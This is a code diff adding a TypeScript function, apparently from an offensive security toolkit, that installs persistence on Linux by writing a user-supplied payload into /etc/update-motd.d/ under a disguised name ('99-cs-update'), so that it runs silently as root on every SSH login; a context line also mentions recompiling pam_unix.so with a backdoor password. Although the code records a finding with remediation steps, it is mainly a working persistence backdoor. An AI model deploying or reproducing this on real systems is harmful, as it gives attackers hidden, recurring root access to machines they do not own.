@@ -596,3 +596,48 @@ echo "  4. Modify pam_unix.so source and recompile with backdoor password"
 
   return { output: output.join("\n"), findings }
 }
+
+export async function motdPersist(args: string[], timeout: number): Promise<HookResult> {
+  const findings: Finding[] = []
+  const output: string[] = ["=== MOTD Persistence ==="]
+  const payload = argVal(args, "--payload")
+  const name = argVal(args, "--name") || "99-cs-update"
+
+  const script = `
+echo "--- MOTD Scripts ---"
+ls -la /etc/update-motd.d/ 2>/dev/null || echo "[-] /etc/update-motd.d/ not found"
+echo ""
+echo "--- MOTD Directory Permissions ---"
+stat /etc/update-motd.d/ 2>/dev/null | grep -i "access"
+echo ""
+${payload ? `
+echo "--- Installing MOTD Persistence ---"
+if [ "$(id -u)" = "0" ] || [ -w /etc/update-motd.d/ ]; then
+  printf '#!/bin/bash\\n${payload} &>/dev/null &\\n' > /etc/update-motd.d/${name} 2>/dev/null
+  chmod +x /etc/update-motd.d/${name} 2>/dev/null
+  echo "[+] MOTD script installed: /etc/update-motd.d/${name} (runs as root on SSH login)"
+else
+  echo "[-] Cannot write to /etc/update-motd.d/ — root required"
+fi
+` : `echo "[*] Dry run — pass --payload <cmd> to install."
+`}
+`
+
+  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
+  output.push(r.stdout || r.stderr)
+
+  if (r.stdout.includes("[+] MOTD script installed")) {
+    findings.push({
+      checkId: "LNX-MOTDP-001",
+      provider: "linuxhook",
+      severity: "HIGH",
+      status: "INSTALLED",
+      resource: `/etc/update-motd.d/${name}`,
+      title: "MOTD persistence installed",
+      details: `MOTD script runs as root on every SSH login — payload executes with root privileges`,
+      remediation: `Remove: rm /etc/update-motd.d/${name}. Audit all scripts in /etc/update-motd.d/.`,
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
